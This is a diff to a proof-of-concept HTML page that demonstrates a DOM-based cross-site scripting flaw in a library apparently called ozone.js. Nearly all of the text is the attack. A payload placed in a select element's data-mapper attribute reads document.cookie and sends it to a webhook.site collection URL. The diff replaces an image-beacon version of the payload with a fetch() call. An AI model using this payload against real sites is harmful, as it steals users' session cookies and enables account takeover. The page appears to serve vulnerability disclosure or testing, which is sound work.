@@ -4,18 +4,12 @@
     <title>PoC DOM XSS - ozone.js</title>
     <meta charset="UTF-8" />
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
-    <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
     <script src="ozone.js"></script>
   </head>
   <body>
     <select
       data-src-url="/api/data"
-      data-mapper="()=>{
-        const i = new Image();
-        i.src = 'https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc?cookie=' + encodeURIComponent(document.cookie);
-        document.body.appendChild(i);
-      }">
+      data-mapper="()=>{fetch('https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc?cookie=' + document.cookie)}">
     </select>
   </body>
 </html>
